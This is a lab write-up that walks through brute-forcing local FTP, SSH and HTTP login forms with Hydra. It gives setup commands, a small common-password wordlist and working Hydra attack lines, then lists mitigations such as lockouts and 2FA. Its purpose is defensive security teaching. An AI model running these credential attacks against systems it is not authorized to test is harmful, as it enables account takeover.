# 💥 Hydra Brute Force Attack Lab

## 🧪 Project Overview

This lab demonstrates how attackers exploit weak password configurations through brute-force attacks using **Hydra**, a powerful login cracker. It simulates real-world penetration testing on FTP, SSH, and HTTP login forms.

---

## 🎯 Key Objectives

* Understand brute force methodology
* Use Hydra to automate login attempts
* Target services with weak/default credentials
* Analyze results and recommend mitigation

---

## 🛠️ Tools & Environment

| Tool           | Purpose                |
| -------------- | ---------------------- |
| Kali Linux     | Attacking machine      |
| Hydra          | Brute force automation |
| vsftpd         | FTP server             |
| openssh-server | SSH server             |

---

## ⚙️ Step 1 – Environment Setup

### 🔧 A. Install Hydra


sudo apt update

sudo apt install hydra -y


### 📡 B. Setup Target Services

#### FTP Server (vsftpd)


sudo apt install vsftpd -y

sudo useradd -m testuser

sudo passwd test

sudo nano /etc/vsftpd.conf


Ensure the following settings:


local_enable=YES

write_enable=YES

chroot_local_user=YES

allow_writeable_chroot=YES

anonymous_enable=NO


Then restart:


sudo systemctl restart vsftpd


#### SSH Server


sudo apt install openssh-server -y

sudo systemctl start ssh

sudo systemctl enable ssh


---

## 📂 Step 2 – Prepare Wordlists

### 🔑 Password List `passwords.txt`


123456

password

admin

test


### 👤 User List `users.txt`


testuser

admin

root


---

## 🚀 Step 3 – Execute Hydra Brute Force

### 🧬 FTP Login


hydra -l testuser -P passwords.txt ftp://127.0.0.1


### 🛡 SSH Login


hydra -l testuser -P passwords.txt ssh://127.0.0.1


### 🌐 HTTP Login (POST form)


hydra -l testuser -P passwords.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"


Replace `/login`, `username`, `password`, and `incorrect` using browser dev tools or Burp Suite to match the form.

---

## 📊 Step 4 – Interpreting Results

Hydra outputs valid credentials in real time. Log success/failure, analyze login behavior, and determine if rate-limiting or lockout mechanisms are absent.

---

## 🔒 Recommendations & Mitigation

* Enforce **strong passwords** (12+ characters)
* Enable **account lockouts** after failed attempts
* Use **rate-limiting** and **2FA**
* Employ intrusion detection/prevention tools (e.g. Fail2Ban)

---

## ✅ Conclusion

This lab illustrates how weak credentials are easily exploited. Brute-force testing is a critical part of ethical hacking and red team exercises. Applying password policies and security controls dramatically reduces exposure.

> "Security is proactive. If you don't test it, attackers will."

---


## 🏷 Badges

![Hydra](https://img.shields.io/badge/Tool-Hydra-blue)
![Kali Linux](https://img.shields.io/badge/OS-Kali_Linux-red)
![Penetration Testing](https://img.shields.io/badge/Focus-Penetration_Testing-yellow)
![Brute Force](https://img.shields.io/badge/Technique-Brute_Force-orange)

---

